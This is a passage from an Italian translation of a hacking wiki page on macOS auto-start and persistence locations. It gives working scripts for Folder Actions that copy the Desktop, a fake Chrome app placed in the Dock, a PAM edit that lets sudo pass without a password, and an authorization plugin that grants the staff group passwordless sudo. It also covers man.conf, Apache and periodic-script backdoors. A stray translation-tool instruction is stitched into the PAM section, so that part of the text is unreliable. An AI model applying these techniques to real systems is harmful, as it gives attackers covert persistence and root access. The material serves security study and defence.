SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Se le attività AT non sono abilitate, le attività create non verranno eseguite.
{% endhint %}

I **file di lavoro** possono essere trovati in `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Il nome del file contiene la coda, il numero del lavoro e l'ora in cui è programmato per essere eseguito. Ad esempio, prendiamo in considerazione `a0001a019bdcd2`.

* `a` - questa è la coda
* `0001a` - numero del lavoro in esadecimale, `0x1a = 26`
* `019bdcd2` - ora in esadecimale. Rappresenta i minuti trascorsi dall'epoca. `0x019bdcd2` corrisponde a `26991826` in decimale. Moltiplicandolo per 60 otteniamo `1619509560`, che corrisponde a `GMT: 27 aprile 2021, martedì 7:46:00`.

Se stampiamo il file del lavoro, scopriamo che contiene le stesse informazioni ottenute utilizzando `at -c`.

### Azioni della cartella

Articolo: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Articolo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Utile per eludere il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma è necessario essere in grado di chiamare `osascript` con argomenti per contattare **`System Events`** per poter configurare le Azioni della cartella
* Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Ha alcune autorizzazioni di base TCC come Desktop, Documenti e Download

#### Posizione

* **`/Library/Scripts/Folder Action Scripts`**
* Richiede privilegi di root
* **Trigger**: Accesso alla cartella specificata
* **`~/Library/Scripts/Folder Action Scripts`**
* **Trigger**: Accesso alla cartella specificata

#### Descrizione ed Esploito

Le Azioni della cartella sono script attivati automaticamente dalle modifiche in una cartella, come l'aggiunta o la rimozione di elementi, o altre azioni come l'apertura o il ridimensionamento della finestra della cartella. Queste azioni possono essere utilizzate per svolgere varie attività e possono essere attivate in modi diversi, come utilizzando l'interfaccia utente del Finder o comandi di terminale.

Per configurare le Azioni della cartella, hai diverse opzioni come:

1. Creare un flusso di lavoro delle Azioni della cartella con [Automator](https://support.apple.com/guide/automator/welcome/mac) e installarlo come servizio.
2. Allegare uno script manualmente tramite la configurazione delle Azioni della cartella nel menu contestuale di una cartella.
3. Utilizzare OSAScript per inviare messaggi di Apple Event a `System Events.app` per configurare in modo programmato un'azione della cartella.
* Questo metodo è particolarmente utile per incorporare l'azione nel sistema, offrendo un livello di persistenza.

Lo script seguente è un esempio di ciò che può essere eseguito da un'azione della cartella:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Per rendere lo script sopra utilizzabile da Folder Actions, compilalo usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Dopo che lo script è compilato, configura le Folder Actions eseguendo lo script di seguito. Questo script abiliterà le Folder Actions a livello globale e specificamente aggiornerà lo script precedentemente compilato nella cartella Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Esegui lo script di installazione con:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Ecco il modo per implementare questa persistenza tramite GUI:

Questo è lo script che verrà eseguito:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compilalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Spostalo in:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Quindi, apri l'app "Folder Actions Setup", seleziona la **cartella che desideri monitorare** e seleziona nel tuo caso **`folder.scpt`** (nel mio caso l'ho chiamato output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Ora, se apri quella cartella con **Finder**, lo script verrà eseguito.

Questa configurazione è stata memorizzata nel **plist** situato in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in formato base64.

Ora, proviamo a preparare questa persistenza senza accesso alla GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in `/tmp` per eseguire il backup:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Rimuovi** le Folder Actions appena impostate:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ora che abbiamo un ambiente vuoto

3. Copia il file di backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Apri l'app Folder Actions Setup per utilizzare questa configurazione: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
E questo non ha funzionato per me, ma queste sono le istruzioni della guida:(
{% endhint %}

### Scorciatoie Dock

Guida: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma è necessario avere installata un'applicazione dannosa nel sistema
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* `~/Library/Preferences/com.apple.dock.plist`
* **Trigger**: Quando l'utente fa clic sull'app nell'area di ancoraggio

#### Descrizione ed Esploito

Tutte le applicazioni che appaiono nell'area di ancoraggio sono specificate nel plist: **`~/Library/Preferences/com.apple.dock.plist`**

È possibile **aggiungere un'applicazione** semplicemente con:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Utilizzando un po' di **ingegneria sociale** potresti **fingerti ad esempio Google Chrome** all'interno del dock e in realtà eseguire il tuo script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Selezionatori di colore

Descrizione: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* È necessaria un'azione molto specifica
* Finirai in un altro sandbox
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* `/Library/ColorPickers`
* Richiede privilegi di root
* Trigger: Utilizzare il selettore di colore
* `~/Library/ColorPickers`
* Trigger: Utilizzare il selettore di colore

#### Descrizione ed Exploit

**Compila un bundle** di selettore di colore con il tuo codice (puoi utilizzare, ad esempio, [**questo**](https://github.com/viktorstrate/color-picker-plus)) e aggiungi un costruttore (come nella sezione [Screen Saver](macos-auto-start-locations.md#screen-saver)) e copia il bundle in `~/Library/ColorPickers`.

Quindi, quando il selettore di colore viene attivato, anche il tuo codice dovrebbe essere eseguito.

Nota che il caricamento binario della tua libreria ha un **sandbox molto restrittivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Plugin di sincronizzazione Finder

**Descrizione**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Descrizione**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Utile per bypassare il sandbox: **No, perché è necessario eseguire la propria app**
* Bypass TCC: ???

#### Posizione

* Un'applicazione specifica

#### Descrizione ed exploit

Un esempio di applicazione con un'estensione di sincronizzazione Finder [**può essere trovato qui**](https://github.com/D00MFist/InSync).

Le applicazioni possono avere `Estensioni di sincronizzazione Finder`. Questa estensione verrà inserita all'interno di un'applicazione che verrà eseguita. Inoltre, affinché l'estensione possa eseguire il proprio codice, **deve essere firmata** con un certificato valido di sviluppatore Apple, deve essere **sandboxed** (anche se potrebbero essere aggiunte eccezioni rilassate) e deve essere registrata con qualcosa del genere:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma finirai in un sandbox di applicazione comune
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* `/System/Library/Screen Savers`
* Richiede i permessi di root
* **Trigger**: Seleziona lo screen saver
* `/Library/Screen Savers`
* Richiede i permessi di root
* **Trigger**: Seleziona lo screen saver
* `~/Library/Screen Savers`
* **Trigger**: Seleziona lo screen saver

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrizione ed Exploit

Crea un nuovo progetto in Xcode e seleziona il template per generare un nuovo **Screen Saver**. Quindi, aggiungi il tuo codice ad esso, ad esempio il seguente codice per generare log.

**Compilalo** e copia il bundle `.saver` in **`~/Library/Screen Savers`**. Quindi, apri l'interfaccia grafica dello Screen Saver e se ci clicchi sopra, dovrebbe generare molti log:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Nota che all'interno dei diritti del binario che carica questo codice (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puoi trovare **`com.apple.security.app-sandbox`** e quindi sarai **all'interno della sandbox dell'applicazione comune**.
{% endhint %}

Codice Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugin di Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Utile per aggirare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma finirai in un sandbox dell'applicazione
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
* Il sandbox sembra molto limitato

#### Posizione

* `~/Library/Spotlight/`
* **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
* `/Library/Spotlight/`
* **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
* Richiede privilegi di root
* `/System/Library/Spotlight/`
* **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
* Richiede privilegi di root
* `Some.app/Contents/Library/Spotlight/`
* **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
* Richiede una nuova app

#### Descrizione ed Esploito

Spotlight è la funzione di ricerca integrata di macOS, progettata per fornire agli utenti **accesso rapido e completo ai dati presenti sui loro computer**.\
Per facilitare questa rapida capacità di ricerca, Spotlight mantiene un **database proprietario** e crea un indice analizzando la maggior parte dei file, consentendo ricerche rapide sia per nome file che per contenuto.

Il meccanismo sottostante di Spotlight coinvolge un processo centrale chiamato 'mds', che sta per **'metadata server'**. Questo processo coordina l'intero servizio di Spotlight. A completamento di ciò, ci sono più demoni 'mdworker' che svolgono una varietà di compiti di manutenzione, come l'indicizzazione di diversi tipi di file (`ps -ef | grep mdworker`). Questi compiti sono resi possibili tramite i plugin di importazione di Spotlight, o **".mdimporter bundles"**, che consentono a Spotlight di comprendere e indicizzare contenuti in una vasta gamma di formati di file.

I plugin o pacchetti **`.mdimporter`** si trovano nei luoghi menzionati in precedenza e se compare un nuovo pacchetto viene caricato entro un minuto (non è necessario riavviare alcun servizio). Questi pacchetti devono indicare quali **tipi di file ed estensioni possono gestire**, in questo modo, Spotlight li utilizzerà quando viene creato un nuovo file con l'estensione indicata.

È possibile **trovare tutti i `mdimporters`** caricati eseguendo:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E ad esempio **/Library/Spotlight/iBooksAuthor.mdimporter** viene utilizzato per analizzare questi tipi di file (estensioni `.iba` e `.book` tra gli altri):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Se controlli il Plist di altri `mdimporter`, potresti non trovare l'ingresso **`UTTypeConformsTo`**. Questo perché è un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) integrato e non ha bisogno di specificare le estensioni.

Inoltre, i plugin predefiniti di sistema hanno sempre la precedenza, quindi un attaccante può accedere solo ai file che non sono altrimenti indicizzati dai `mdimporters` di Apple.
{% endhint %}

Per creare il tuo importer, puoi iniziare con questo progetto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e quindi cambiare il nome, i **`CFBundleDocumentTypes`** e aggiungere **`UTImportedTypeDeclarations`** in modo che supporti l'estensione che desideri supportare e riflettili in **`schema.xml`**.\
Quindi **modifica** il codice della funzione **`GetMetadataForFile`** per eseguire il tuo payload quando viene creato un file con l'estensione elaborata.

Infine, **compila e copia il tuo nuovo `.mdimporter`** in una delle posizioni precedenti e puoi controllare quando viene caricato **monitorando i log** o controllando **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
Non sembra che funzioni più.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Richiede una specifica azione dell'utente
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Descrizione

Non sembra che funzioni più.

## Bypass del sandbox di root

{% hint style="success" %}
Qui puoi trovare le posizioni di avvio utili per il **bypass del sandbox** che ti consente di eseguire semplicemente qualcosa **scrivendolo in un file** essendo **root** e/o richiedendo altre **condizioni strane**.
{% endhint %}

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma devi essere root
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Richiede privilegi di root
* **Trigger**: Quando arriva il momento
* `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
* Richiede privilegi di root
* **Trigger**: Quando arriva il momento

#### Descrizione ed Esploito

Gli script periodici (**`/etc/periodic`**) vengono eseguiti a causa dei **launch daemons** configurati in `/System/Library/LaunchDaemons/com.apple.periodic*`. Nota che gli script memorizzati in `/etc/periodic/` vengono **eseguiti** come **proprietario del file**, quindi ciò non funzionerà per un potenziale escalation dei privilegi.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Ci sono altri script periodici che verranno eseguiti indicati in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se riesci a scrivere uno dei file `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`, verrà **eseguito prima o poi**.

{% hint style="warning" %}
Nota che lo script periodico verrà **eseguito come proprietario dello script**. Quindi se uno user normale è il proprietario dello script, verrà eseguito come tale user (questo potrebbe prevenire attacchi di escalation di privilegi).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma devi essere root
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* Root sempre richiesto

#### Descrizione ed Esploito

Poiché PAM è più focalizzato sulla **persistenza** e sul malware che sull'esecuzione semplice all'interno di macOS, questo blog non fornirà una spiegazione dettagliata, **leggi i writeup per comprendere meglio questa tecnica**.

Controlla i moduli PAM con:
```bash
ls -l /etc/pam.d
```
Una tecnica di persistenza/escalation dei privilegi che sfrutta PAM è semplice come modificare il modulo /etc/pam.d/sudo aggiungendo all'inizio la riga:
```bash
auth       sufficient     pam_permit.so
```
Il seguente è il contenuto di un libro di hacking sulle tecniche di hacking. Il seguente contenuto proviene dal file /hive/hacktricks/macos-hardening/macos-auto-start-locations.md. Traduci il testo inglese pertinente in italiano e restituisci la traduzione mantenendo esattamente la stessa sintassi markdown e html. Non tradurre cose come codice, nomi di tecniche di hacking, parole di hacking, nomi di piattaforme cloud/SaaS (come Workspace, aws, gcp...), la parola 'leak', pentesting e tag markdown. Inoltre, non aggiungere nulla di extra oltre alla traduzione e alla sintassi markdown.
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E quindi qualsiasi tentativo di utilizzare **`sudo` funzionerà**.

{% hint style="danger" %}
Si noti che questa directory è protetta da TCC, quindi è molto probabile che all'utente venga richiesto l'accesso.
{% endhint %}

### Plugin di autorizzazione

Articolo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Articolo: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Utile per aggirare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma è necessario essere root e fare configurazioni extra
* Bypass di TCC: ???

#### Posizione

* `/Library/Security/SecurityAgentPlugins/`
* Richiede privilegi di root
* È anche necessario configurare il database di autorizzazione per utilizzare il plugin

#### Descrizione ed Esploito

È possibile creare un plugin di autorizzazione che verrà eseguito quando un utente effettua il login per mantenere la persistenza. Per ulteriori informazioni su come creare uno di questi plugin, controllare gli articoli precedenti (e fare attenzione, un plugin scritto male può bloccarti e sarà necessario pulire il tuo Mac dalla modalità di ripristino).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Sposta** il bundle nella posizione da caricare:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Infine, aggiungi la **regola** per caricare questo Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Il comando **`evaluate-mechanisms`** indicherà al framework di autorizzazione che sarà necessario **chiamare un meccanismo esterno per l'autorizzazione**. Inoltre, l'opzione **`privileged`** farà sì che venga eseguito come root.

Esegui il comando:
```bash
security authorize com.asdf.asdf
```
E poi il **gruppo staff dovrebbe avere accesso sudo** (leggi `/etc/sudoers` per confermare).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma è necessario essere root e l'utente deve utilizzare man
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* **`/private/etc/man.conf`**
* Richiede privilegi di root
* **`/private/etc/man.conf`**: Ogni volta che viene utilizzato man

#### Descrizione ed exploit

Il file di configurazione **`/private/etc/man.conf`** indica il binario/script da utilizzare quando si aprono i file di documentazione di man. Quindi il percorso dell'eseguibile potrebbe essere modificato in modo che ogni volta che l'utente utilizza man per leggere alcuni documenti, venga eseguita una backdoor.

Ad esempio impostato in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E quindi crea `/tmp/view` come:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma è necessario essere root e apache deve essere in esecuzione
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd non ha entitlements

#### Posizione

* **`/etc/apache2/httpd.conf`**
* Richiede privilegi di root
* Trigger: quando Apache2 viene avviato

#### Descrizione ed Exploit

Puoi indicare in `/etc/apache2/httpd.conf` di caricare un modulo aggiungendo una riga come questa:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

In questo modo i tuoi moduli compilati verranno caricati da Apache. L'unica cosa è che devi **firmarlo con un certificato Apple valido**, oppure devi **aggiungere un nuovo certificato fidato** nel sistema e **firmarlo** con esso.

Successivamente, se necessario, per assicurarti che il server venga avviato, puoi eseguire:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Esempio di codice per il Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Framework di audit BSM

Scrittura: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Ma è necessario essere root, auditd deve essere in esecuzione e causare un avviso
* Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* **`/etc/security/audit_warn`**
* Richiede privilegi di root
* **Trigger**: Quando auditd rileva un avviso

